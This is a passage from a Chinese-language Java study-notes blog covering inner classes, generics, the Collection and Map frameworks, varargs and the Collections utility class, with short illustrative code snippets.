<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 <span class="class"><span class="keyword">class</span> 实现类 <span class="keyword">implements</span> 接口1, 接口2, 接口3 , ... </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="接口与接口的关系"><a href="#接口与接口的关系" class="headerlink" title="接口与接口的关系"></a>接口与接口的关系</h5><ul>
<li>多继承，一个接口可以同时继承多个接口</li>
<li>规范合并，整合多个接口为同一个接口，便于子类实现</li>
</ul>
<h4 id="内部类概述"><a href="#内部类概述" class="headerlink" title="内部类概述"></a>内部类概述</h4><h5 id="认识一下嘛-5"><a href="#认识一下嘛-5" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li><p>内部类就是定义在一个类里面的类，里面的类可以理解为寄生，外面的类可以理解为宿主</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">People</span></span>&#123;</span><br><span class="line">  <span class="comment">// 内部类</span></span><br><span class="line">  <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Heart</span></span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h5><ul>
<li>当一个事物的内部还有一个部分需要一个完整的结构进行概述，而这个内部的完整的结构又只为外部事物提供服务，那么这个内部事物就可以选择用内部类来设计</li>
<li>内部类通常可以方便的访问外部成员，包括<strong>私有的成员</strong></li>
</ul>
<h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><ul>
<li>提供了更好的封装性，可以在封装性这个层面做到更多控制</li>
</ul>
<h4 id="内部类之一：静态内部类（了解）"><a href="#内部类之一：静态内部类（了解）" class="headerlink" title="内部类之一：静态内部类（了解）"></a>内部类之一：静态内部类（了解）</h4><h5 id="认识一下嘛-6"><a href="#认识一下嘛-6" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>有 static 修饰，属于外部类本身</li>
<li>和普通类使用完全一致</li>
</ul>
<h5 id="格式-3"><a href="#格式-3" class="headerlink" title="格式"></a>格式</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;</span><br><span class="line">  <span class="comment">// 静态成员内部类</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">外部类名.内部类名 对象名称 = <span class="keyword">new</span> 外部类名.内部类构造器;</span><br><span class="line">Outer.Inner in = <span class="keyword">new</span> Outer.Inner();</span><br></pre></td></tr></table></figure>

<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
<li>譬如汽车类中的发动机类</li>
<li>可以直接访问外部类的静态成员，不能直接访问外部类的实例成员</li>
</ul>
<h4 id="内部类之二：成员内部类（了解）"><a href="#内部类之二：成员内部类（了解）" class="headerlink" title="内部类之二：成员内部类（了解）"></a>内部类之二：成员内部类（了解）</h4><h5 id="认识一下嘛-7"><a href="#认识一下嘛-7" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>无static修饰，属于外部类的对象</li>
<li>JDK16之前，成员内部类中不能定义静态成员，JDK 16开始也可以定义静态成员了</li>
</ul>
<h5 id="格式-4"><a href="#格式-4" class="headerlink" title="格式"></a>格式</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;</span><br><span class="line">  <span class="comment">// 成员内部类</span></span><br><span class="line">  <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">外部类名.内部类名 对象名称 = <span class="keyword">new</span> 外部类构造器.new 内部类构造器;</span><br><span class="line">Outer.Inner in = <span class="keyword">new</span> Outer().<span class="function">new <span class="title">Inner</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><ul>
<li>譬如人类中的心脏类</li>
<li>可以直接访问外部类的静态成员，可以通过实例方法直接访问外部类的实例成员</li>
</ul>
<h4 id="内部类之三：局部内部类（了解）"><a href="#内部类之三：局部内部类（了解）" class="headerlink" title="内部类之三：局部内部类（了解）"></a>内部类之三：局部内部类（了解）</h4><h5 id="认识一下嘛-8"><a href="#认识一下嘛-8" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>局部内部类放在方法、代码块、构造器等执行体中</li>
<li>局部内部类的类文件名为：<code>外部类$内部类.class</code></li>
</ul>
<h4 id="内部类之四：匿名内部类"><a href="#内部类之四：匿名内部类" class="headerlink" title="内部类之四：匿名内部类"></a>内部类之四：匿名内部类</h4><h5 id="认识一下嘛-9"><a href="#认识一下嘛-9" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>本质上是一个没有名字的局部内部类，定义在方法、代码块等</li>
<li>方便创建子类对象，其实质就是为了简化代码</li>
</ul>
<h5 id="格式-5"><a href="#格式-5" class="headerlink" title="格式"></a>格式</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> 类||抽象类名||接口名()&#123;</span><br><span class="line">  重写方法;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Animal a = <span class="keyword">new</span> Animal() &#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">a. run();</span><br></pre></td></tr></table></figure>

<h5 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h5><ul>
<li>匿名内部类是没有名称的</li>
<li>会创建一个匿名内部类的对象</li>
<li>匿名内部类的对象就是当前<code>new</code>的那个类型的子类</li>
</ul>
<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><ul>
<li><p>案例一</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*游泳接口*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Swimming</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 测试类*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JumppingDemo</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//需求：goSwimming方法</span></span><br><span class="line">    JumppingDemo.goSwimming(<span class="keyword">new</span> Swimming()&#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Poria不会游泳~~~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 以上代码还可简化为</span></span><br><span class="line">    JumppingDemo.goSwimming(() -&gt; System.out.println(<span class="string">&quot;Poria不会游泳~~~&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 定义一个方法让所有角色进来一起比赛</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">goSwimming</span><span class="params">(Swimming swimming)</span> </span>&#123;</span><br><span class="line">    swimming.swim();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>案例二</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  为按钮绑定点击事件监听器</span></span><br><span class="line">btn.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;登录一下~~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上代码还可简化为</span></span><br><span class="line">btn.addActionListener(e -&gt; System.out.println(<span class="string">&quot;登录一下~~&quot;</span>));</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Develop</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>愿天堂没有Java之集合</title>
    <url>/2021/12/14/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java%E4%B9%8B%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<p><strong>JavaSE 笔记（四）</strong></p>
<span id="more"></span>

<blockquote>
<p>Java 是一门非常严谨的语言</p>
</blockquote>
<h4 id="泛型概述"><a href="#泛型概述" class="headerlink" title="泛型概述"></a>泛型概述</h4><h5 id="认识一下嘛"><a href="#认识一下嘛" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>可以在编译阶段约束操作的数据类型</li>
<li>格式为：<code>&lt;数据类型&gt;</code>，只能支持引用数据类型</li>
<li>可以定义的地方<ul>
<li>泛型类：类后面定义</li>
<li>泛型方法：方法申明上定义</li>
<li>泛型接口：接口后面定义</li>
</ul>
</li>
</ul>
<h5 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h5><ul>
<li>统一数据类型，把出现泛型变量的地方全部替换为传输的真实数据类型</li>
<li>把运行时期可能出现的问题提到了编译期间，避免了强制类型转换可能出现的异常</li>
</ul>
<h5 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h5><ul>
<li><p>格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 <span class="class"><span class="keyword">class</span> 类名&lt;泛型变量&gt;</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyArrayList</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ArrayList lists = <span class="keyword">new</span> ArrayList();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        lists.add(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        lists.remove(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> lists.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>作用：编译阶段约定操作的数据的类型，类似于集合的作用</p>
</li>
</ul>
<h5 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h5><ul>
<li><p>格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 &lt;泛型变量&gt; 方法返回值 方法名称(形参列表)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(T[] arr)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(arr == <span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> System.out.println(arr);</span><br><span class="line">  &#125;</span><br><span class="line">  StringBuilder sb = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</span><br><span class="line">    sb.append(arr[i]).append(i == arr.length - <span class="number">1</span> ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;,&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sb.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">  System.out.println(sb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>作用：方法中可以使用泛型接收一切实际类型的参数，方法更具备通用性</p>
</li>
</ul>
<h5 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h5><ul>
<li><p>格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 <span class="class"><span class="keyword">interface</span> 接口名称&lt;泛型变量&gt;</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Data</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">queryById</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>作用：实现类可以在实现接口的时候传入自己操作的数据类型，这样重写的方法都将是针对于该类型的操作</p>
</li>
</ul>
<h5 id="通配符与上下限"><a href="#通配符与上下限" class="headerlink" title="通配符与上下限"></a>通配符与上下限</h5><ul>
<li>通配符<code>?</code><ul>
<li>可以在<strong>使用</strong>泛型中代表一切类型</li>
<li><code>E T K V</code>是在<strong>定义</strong>泛型的时候使用的</li>
</ul>
</li>
<li>上下限<ul>
<li><code>? extends Car</code>：此时，<code>?</code>必须是 Car 或者其子类，泛型上限</li>
<li><code>? super Car</code>：此时，<code>?</code>必须是 Car 或者其父类，泛型下限</li>
</ul>
</li>
</ul>
<h4 id="集合概述"><a href="#集合概述" class="headerlink" title="集合概述"></a>集合概述</h4><h5 id="认识一下嘛-1"><a href="#认识一下嘛-1" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>集合和数组都是容器，用来存放数据</li>
<li>数组可以存储基本数据类型和引用类型，集合<strong>只能存储引用类型</strong></li>
<li>但是数组完成定义之后，类型确定，长度确定；但是集合启动之后，<strong>类型长度都可以发生变化</strong>，更像是气球</li>
</ul>
<h5 id="体系特点"><a href="#体系特点" class="headerlink" title="体系特点"></a>体系特点</h5><ul>
<li>集合分为两类<ul>
<li><code>Collection</code>单列集合，每个元素只包含一个值</li>
<li><code>Map</code>双列集合，每个元素包含两个值（键值对）</li>
</ul>
</li>
</ul>
<h4 id="Collection-集合"><a href="#Collection-集合" class="headerlink" title="Collection 集合"></a>Collection 集合</h4><h5 id="认识一下嘛-2"><a href="#认识一下嘛-2" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>List（接口） 系列集合<ul>
<li>ArrayList（实现类）：有序、可重复、有索引</li>
<li>LinkedList（实现类）：有序、可重复、有索引</li>
</ul>
</li>
<li>Set（接口） 系列集合<ul>
<li>HashSet（实现类）：无序、不重复、无索引</li>
<li>LinkedHashSet（实现类）：有序、不重复、无索引</li>
<li>TreeSet（实现类）：按照大小默认升序排列、不重复、无索引</li>
</ul>
</li>
</ul>
<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><ul>
<li>集合支持泛型</li>
<li>集合与泛型不支持基本类型，只支持引用类型</li>
<li>集合中存储的元素都被认为是对象</li>
</ul>
<h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><ul>
<li><p>Collection 是单列集合的祖宗接口，它的功能全部单列集合都可以继承使用</p>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public  boolean add(E e)</code></td>
<td>把给定的对象添加到当前集合中</td>
</tr>
<tr>
<td><code>public  void clear()</code></td>
<td>清空集合中所有的元素</td>
</tr>
<tr>
<td><code>public  boolean remove(E e)</code></td>
<td>把给定的对象在当前集合中删除</td>
</tr>
<tr>
<td><code>public  boolean contains(Object obj)</code></td>
<td>判断当前集合中是否包含给定的对象</td>
</tr>
<tr>
<td><code>public  boolean isEmpty()</code></td>
<td>判断当前集合是否为空</td>
</tr>
<tr>
<td><code>public  int size()</code></td>
<td>返回集合中元素的个数。</td>
</tr>
<tr>
<td><code>public  Object[] toArray()</code></td>
<td>把集合中的元素，存储到数组中</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="集合的遍历方式"><a href="#集合的遍历方式" class="headerlink" title="集合的遍历方式"></a>集合的遍历方式</h5><ul>
<li><p>方式一：迭代器</p>
<ul>
<li><p>获取迭代器</p>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>Iterator&lt;E&gt;  iterator()</code></td>
<td>返回集合中的迭代器对象，该迭代器对象默认指向当前集合的0索引</td>
</tr>
</tbody></table>
</li>
<li><p>常用方法</p>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>boolean hasNext()</code></td>
<td>询问当前位置是否有元素存在，存在返回true ,不存在返回false</td>
</tr>
<tr>
<td><code>E  next()</code></td>
<td>获取当前位置的元素，并同时将迭代器对象移向下一个位置，注意防止取出越界。</td>
</tr>
</tbody></table>
</li>
<li><p>用例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Iterator&lt;String&gt; it = lists.iterator();</span><br><span class="line"><span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line">  String ele = it.next();</span><br><span class="line">  System.out.println(ele);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>方式二：增强 for 循环</p>
<ul>
<li><p>既可以遍历集合也可以遍历数组</p>
</li>
<li><p>在遍历删除时可能会出现并发修改异常</p>
</li>
<li><p>用例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(元素数据类型 变量名 : 数组或者Collection集合) &#123;</span><br><span class="line">         <span class="comment">//在此处使用变量即可，该变量就是元素</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Collection&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">list.add(<span class="string">&quot;poria1&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;poria2&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;poria3&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(String ele : list) &#123;</span><br><span class="line">  System.out.println(ele);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>方式三：lambda 表达式</p>
<ul>
<li><p>方法</p>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>default void forEach(Consumer&lt;? super T&gt; action):</code></td>
<td>结合lambda遍历集合</td>
</tr>
</tbody></table>
</li>
<li><p>用例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Collection&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">list.add(<span class="string">&quot;poria1&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;poria2&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;poria3&quot;</span>);</span><br><span class="line">lists.forEach(<span class="keyword">new</span> Consumer&lt;String&gt;()&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function">pubilc <span class="keyword">void</span> <span class="title">accept</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line">    System.out.println(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上代码可以简化为</span></span><br><span class="line">lists.forEach(s -&gt; System.out.println(s));</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h5 id="List-系列集合"><a href="#List-系列集合" class="headerlink" title="List 系列集合"></a>List 系列集合</h5><ul>
<li><p>特有方法</p>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>void add(int  index,E element)</code></td>
<td>在此集合中的指定位置插入指定的元素</td>
</tr>
<tr>
<td><code>E remove(int  index)</code></td>
<td>删除指定索引处的元素，返回被删除的元素</td>
</tr>
<tr>
<td><code>E set(int index,E  element)</code></td>
<td>修改指定索引处的元素，返回被修改的元素</td>
</tr>
<tr>
<td><code>E get(int  index)</code></td>
<td>返回指定索引处的元素</td>
</tr>
</tbody></table>
</li>
<li><p>遍历方式</p>
<ul>
<li>迭代器</li>
<li>增强 for 循环</li>
<li>Lambda 表达式</li>
<li>for 循环（List 集合有索引）</li>
</ul>
</li>
<li><p>ArrayList</p>
<ul>
<li>基于数组实现，定位元素快，增删则需要移位，效率较低</li>
<li>第一次创建集合并添加元素时，会默认创建一个长度为10的数组</li>
</ul>
</li>
<li><p>LinkedList</p>
<ul>
<li><p>基于双链表实现，首位操作快，查询慢</p>
</li>
<li><p>特有功能</p>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public  void addFirst(E e)</code></td>
<td>在该列表开头插入指定的元素</td>
</tr>
<tr>
<td><code>public  void addLast(E e)</code></td>
<td>将指定的元素追加到此列表的末尾</td>
</tr>
<tr>
<td><code>public  E getFirst()</code></td>
<td>返回此列表中的第一个元素</td>
</tr>
<tr>
<td><code>public  E getLast()</code></td>
<td>返回此列表中的最后一个元素</td>
</tr>
<tr>
<td><code>public  E removeFirst()</code></td>
<td>从此列表中删除并返回第一个元素</td>
</tr>
<tr>
<td><code>public  E removeLast()</code></td>
<td>从此列表中删除并返回最后一个元素</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
<h5 id="Set-系列集合"><a href="#Set-系列集合" class="headerlink" title="Set 系列集合"></a>Set 系列集合</h5><ul>
<li>常见方法<ul>
<li>功能与 Collection 的基本一致</li>
</ul>
</li>
<li>LinkedHashSet<ul>
<li>基于数组 + 双链表 + 红黑树实现</li>
</ul>
</li>
<li>TreeSet<ul>
<li>基于红黑树实现排序</li>
<li>该集合一定要排序，可以将元素按照指定的规则排序</li>
</ul>
</li>
</ul>
<h5 id="使用场景总结"><a href="#使用场景总结" class="headerlink" title="使用场景总结"></a>使用场景总结</h5><ul>
<li>元素可重复，有索引，索引查询要快<ul>
<li>ArrayList 基于数组</li>
</ul>
</li>
<li>元素可重复，有索引，首位操作快<ul>
<li>LinkedList 基于链表</li>
</ul>
</li>
<li>增删改查快，元素不重复、无序、无索引<ul>
<li>HashSet 基于哈希表</li>
</ul>
</li>
<li>增删改查快、元素不重复、有序、无索引<ul>
<li>LinkedHashSet 基于哈希表和双链表</li>
</ul>
</li>
</ul>
<h4 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h4><h5 id="认识一下嘛-3"><a href="#认识一下嘛-3" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li><p>可变参数在形参中可以接收<strong>多个数据</strong></p>
</li>
<li><p>格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">数据类型...参数名称</span><br><span class="line"></span><br><span class="line">sum(); <span class="comment">// 1、不传参数</span></span><br><span class="line">sum(<span class="number">10</span>); <span class="comment">// 2、可以传输一个参数</span></span><br><span class="line">sum(<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>); <span class="comment">// 3、可以传输多个参数</span></span><br><span class="line">sum(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;); <span class="comment">// 4、可以传输一个数组</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span>...nums)</span></span></span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><ul>
<li>非常灵活，方便。可以不传输参数，可以传输1个或者多个，也可以传输一个数组</li>
<li>可变参数在内部本质上就是一个数组</li>
</ul>
<h5 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h5><ul>
<li>一个形参列表中可变参数只能有一个</li>
<li>可变参数必须<strong>放在形参列表最后面</strong></li>
</ul>
<h4 id="集合工具类"><a href="#集合工具类" class="headerlink" title="集合工具类"></a>集合工具类</h4><h5 id="认识一下嘛-4"><a href="#认识一下嘛-4" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li><code>java.utils.Collections</code>：是集合工具类</li>
<li>Collections 不属于集合，是用来操作集合的工具类</li>
</ul>
<h5 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h5><table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public static &lt;T&gt; boolean  addAll(Collection&lt;? super T&gt; c, T... elements)</code></td>
<td>给集合对象批量添加元素</td>
</tr>
<tr>
<td><code>public static void shuffle(List&lt;?&gt; list)</code></td>
<td>打乱List集合元素的顺序</td>
</tr>
<tr>
<td><code>public static &lt;T&gt; void sort(List&lt;T&gt; list)</code></td>
<td>将集合中元素按照默认规则排序</td>
</tr>
<tr>
<td><code>public static &lt;T&gt; void sort(List&lt;T&gt; list，Comparator&lt;? super T&gt; c)</code></td>
<td>将集合中元素按照指定规则排序</td>
</tr>
</tbody></table>
<h4 id="Map-集合"><a href="#Map-集合" class="headerlink" title="Map 集合"></a>Map 集合</h4><h5 id="认识一下嘛-5"><a href="#认识一下嘛-5" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>一种双列集合，每个元素包含两个数据</li>
<li>每个元素格式：<code>key=value</code>（键值对元素）</li>
<li>也被称为“键值对集合”</li>
<li><code>&#123;key1=value1, key2=value2, key3=value3, ...&#125;</code></li>
</ul>
<h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><ul>
<li>键占主导</li>
<li>键是无序，不重复，无索引的，值不做要求</li>
<li>当键重复时，后面的键对应的值会覆盖前面的键的值</li>
<li>键值对都可以为 null</li>
<li>实现类<ul>
<li>HashMap：键是无序，不重复，无索引</li>
<li>LinkedHashMap：键是有序，不重复，无索引</li>
<li>TreeMap：键是排序，不重复，无索引</li>
</ul>
</li>
</ul>
<h5 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h5><table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>V  put(K key,V value)</code></td>
<td>添加元素</td>
</tr>
<tr>
<td><code>V  remove(Object key)</code></td>
<td>根据键删除键值对元素</td>
</tr>
<tr>
<td><code>void  clear()</code></td>
<td>移除所有的键值对元素</td>
</tr>
<tr>
<td><code>boolean containsKey(Object key)</code></td>
<td>判断集合是否包含指定的键</td>
</tr>
<tr>
<td><code>boolean containsValue(Object value)</code></td>
<td>判断集合是否包含指定的值</td>
</tr>
<tr>
<td><code>boolean isEmpty()</code></td>
<td>判断集合是否为空</td>
</tr>
<tr>
<td><code>int  size()</code></td>
<td>集合的长度，也就是集合中键值对的个数</td>
</tr>
</tbody></table>
<h5 id="遍历方式"><a href="#遍历方式" class="headerlink" title="遍历方式"></a>遍历方式</h5><ul>
<li><p>方式一：键找值</p>
<ul>
<li><p>先获取 Map 集合的全部键的 Set 集合</p>
</li>
<li><p>遍历键的 Set 集合，然后通过键提取对应值</p>
</li>
<li><p>用到的方法</p>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>Set&lt;K&gt;  keySet()</code></td>
<td>获取所有键的集合</td>
</tr>
<tr>
<td><code>V  get(Object key)</code></td>
<td>根据键获取值</td>
</tr>
</tbody></table>
</li>
<li><p>用例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String , Integer&gt; maps = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">maps.put(<span class="string">&quot;Poria&quot;</span>,<span class="number">100</span>);</span><br><span class="line">maps.put(<span class="string">&quot;Pupi1&quot;</span>,<span class="number">100</span>);</span><br><span class="line">Set&lt;String&gt; keys = maps.keySet();</span><br><span class="line"><span class="keyword">for</span> (String key : keys) &#123;</span><br><span class="line">  <span class="keyword">int</span> value = maps.get(key);</span><br><span class="line">  System.out.println(key + <span class="string">&quot;===&gt;&quot;</span> + value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
